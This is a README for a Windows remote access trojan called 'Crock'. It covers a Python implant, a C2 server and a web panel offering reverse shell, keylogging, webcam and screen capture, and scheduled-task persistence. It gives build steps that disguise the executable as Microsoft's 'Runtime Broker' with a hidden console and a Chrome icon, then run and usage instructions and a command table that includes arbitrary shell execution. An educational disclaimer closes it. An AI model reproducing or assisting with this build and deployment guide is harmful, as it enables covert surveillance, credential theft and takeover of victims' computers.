# Crock
Remote access tool with web control panel.  
Python implant compiled with Nuitka.

## Features
- Reverse shell
- Screenshot
- Webcam photo
- Process list
- Keylogger (start / dump / stop / clear)
- Screen stream
- Persistence (scheduled task)
- Encrypted channel
- Web control panel

## Requirements
- Linux (Kali / Ubuntu / Debian) — build + server
- Windows 10/11 — target
- Python 3.10+
- Nuitka

## Install dependencies
```bash
sudo apt update
sudo apt install -y python3 python3-pip python3-venv
python3 -m venv venv
source venv/bin/activate
pip install flask mss pillow opencv-python psutil pynput nuitka ordered-set zstandard
```

## Files
- `implant.py` — implant source
- `server.py` — C2 listener + web server
- `dashboard.html` — web panel (must be next to `server.py`)
- `chrome.ico` — icon for the build (optional)

## Build implant
Edit `HOST` in `implant.py` if needed (default `192.168.122.1`).

IN Windows in CMD:
```bash
nuitka ^
  --standalone ^
  --onefile ^
  --windows-disable-console ^
  --windows-company-name="Microsoft Corporation" ^
  --windows-product-name="Runtime Broker" ^
  --windows-file-description="Runtime Broker" ^
  --windows-file-version=10.0.19041.1 ^
  --windows-product-version=10.0.19041.1 ^
  --windows-icon-from-ico=chrome.ico ^
  --enable-plugin=anti-bloat ^
  --assume-yes-for-downloads ^
  --remove-output ^
  implant.py
```

Output: `implant.exe` (rename to anything).

## Run server
```bash
source venv/bin/activate
python3 server.py
```
- Listener: `0.0.0.0:4444`
- Web UI: `http://127.0.0.1:5000`

## Usage
1. Start `server.py`.
2. Run the compiled exe on the Windows machine.
3. Open `http://127.0.0.1:5000`.
4. Select the client and use the panel.

## Commands
Command,Action
info,Client information
screenshot,Take screenshot
webcam,Webcam photo
proclist,List processes
keylog_start,Start keylogger
keylog_dump,Dump keylogger buffer
keylog_stop,Stop keylogger
keylog_clear,Clear keylogger buffer
stream_start,Start screen stream
stream_stop,Stop screen stream
persist,Add scheduled task
sh:<cmd>,Execute shell command

## Notes
- Web UI listens only on localhost.
- Default C2 address is `192.168.122.1:4444`.
- Persistence uses a scheduled task.
- Lab / authorized use only.

## Disclaimer
For educational and research purposes only.
